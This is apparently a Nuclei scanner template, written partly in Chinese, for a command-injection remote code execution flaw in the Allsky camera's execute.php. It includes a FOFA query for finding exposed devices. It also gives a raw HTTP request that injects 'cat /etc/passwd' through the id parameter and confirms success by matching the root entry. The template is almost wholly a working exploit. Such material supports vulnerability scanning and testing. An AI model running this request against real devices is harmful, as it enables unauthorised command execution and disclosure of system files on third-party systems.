id: allsky-ip-camera-execute-path-traversal-rce

info:
  name: "Allsky execute 组件路径遍历导致远程代码执行"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: (icon_hash="-1842970372" && server=="Allsky") || title="Allsky Camera"
      该设备管理组件存在路径遍历缺陷，攻击者可通过构造恶意请求参数突破目录限制，向系统执行层注入任意命令。漏洞源于对用户输入的路径参数缺乏规范化校验，结合命令拼接逻辑缺陷，可实现远程代码执行。
  tags: Allsky

http:
- raw:
  - |
    GET /execute.php?id=allsky-config%20cat%20/etc/passwd HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'root:x:0:0'
